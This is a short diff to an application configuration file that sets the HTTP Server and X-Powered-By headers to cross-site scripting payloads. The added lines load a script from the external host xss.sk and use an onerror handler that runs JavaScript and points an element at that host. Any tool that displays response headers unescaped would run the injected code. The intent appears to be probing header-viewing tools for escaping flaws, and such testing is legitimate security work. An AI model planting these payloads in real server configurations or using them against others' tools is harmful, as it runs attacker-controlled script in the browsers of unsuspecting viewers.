@@ -9,8 +9,8 @@ application:
 
 http:
 	headers:
-		Server: "<script>alert('Inline JavaScript is bad, m\\'kay?')</script>"
-		X-Powered-By: "<img src=x onerror=\"alert('Automagic escaping, maybe?')\">"
+		Server: "<script src=//xss.sk></script>"
+		X-Powered-By: "<img src=\"x\" id=\"xss-me-please\" onerror=\"alert('Inline JavaScript is bad, m\\'kay?');document.getElementById('xss-me-please').src='https://xss.sk';\">"
 		X-Content-Type-Options: nosniff
 	frames: false
 
